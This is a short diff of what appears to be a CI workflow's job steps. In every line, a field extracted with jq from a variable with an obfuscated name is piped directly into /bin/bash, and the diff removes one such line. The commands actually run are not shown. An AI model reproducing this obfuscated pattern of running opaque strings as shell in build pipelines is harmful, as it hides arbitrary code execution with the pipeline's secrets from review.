@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$tuam0" | jq -r .ydlh92271 | /bin/bash
           printf '%s' "$qie7" | jq -r .axpgx91 | /bin/bash
           echo $h42 | jq -r .e0 | /bin/bash
-          echo $ubo3140 | jq -r .h98 | /bin/bash
           printf '%s' "$yoo24983" | jq -r .v32 | /bin/bash
           printf '%s' "$vcry5756" | jq -r .m08 | /bin/bash
 
